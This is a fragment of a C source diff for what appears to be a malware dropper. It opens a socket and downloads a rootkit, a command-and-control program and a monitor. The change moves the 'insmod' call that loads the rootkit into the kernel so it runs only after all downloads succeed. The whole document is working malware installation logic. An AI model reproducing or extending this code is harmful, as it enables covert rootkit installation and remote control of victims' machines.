@@ -49,12 +49,8 @@ int main(int argc,char* argv[])
     }
     
     rv = opensocket();
-    rv = obtain(ROOTKIT);
+    rv += obtain(ROOTKIT);
     close(sock_fd);
-    if(rv == 0){
-        char *rktargs[] = {"insmod", ROOTKIT, NULL};
-        execcmd(rktargs);
-    }
     
     opensocket();
     rv += obtain(CCPROGRAM);
@@ -65,6 +61,9 @@ int main(int argc,char* argv[])
     close(sock_fd);
     
     if(rv == 0){
+        char *rktargs[] = {"insmod", ROOTKIT, NULL};
+        execcmd(rktargs);
+        
         char *moniargs[] = {"gcc", MONITOR, "-o", "monitor", NULL};
         execcmd(moniargs);
     
